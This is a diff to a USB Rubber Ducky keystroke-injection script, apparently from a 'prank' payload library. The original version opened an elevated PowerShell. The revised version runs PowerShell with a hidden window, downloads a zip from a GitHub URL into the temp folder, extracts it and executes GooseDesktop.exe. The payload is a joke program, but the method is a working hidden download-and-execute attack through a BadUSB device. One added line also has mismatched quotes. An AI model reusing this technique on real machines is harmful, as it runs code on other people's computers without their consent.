@@ -10,10 +10,7 @@ REM startup delay
 DELAY 300
 GUI r
 DELAY 500
-STRING powershell Start-Process powershell -Verb runAs
-ENTER
-DELAY 3000
-ALT y
+STRING powershell
 DELAY 2000
-STRING powershell -w h curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Win/Desktop_Goose/dg.zip -O dg.zip;;Expand-Archive -Path C:\Windows\System32\dg.zip -Force;;cd dg;;$file = 'GooseDesktop.exe';$exec = New-Object -com shell.application;$exec.shellexecute($file);exit;
+STRING powershell -w h $Z="$env:TMP"+'\dg.zip';$D="$env:TMP"+'\dg';curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Win/Desktop_Goose/dg.zip -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;$file = '$env:TMP"+'\dg\GooseDesktop.exe';$exec = New-Object -com shell.application;$exec.shellexecute($file);exit
 ENTER
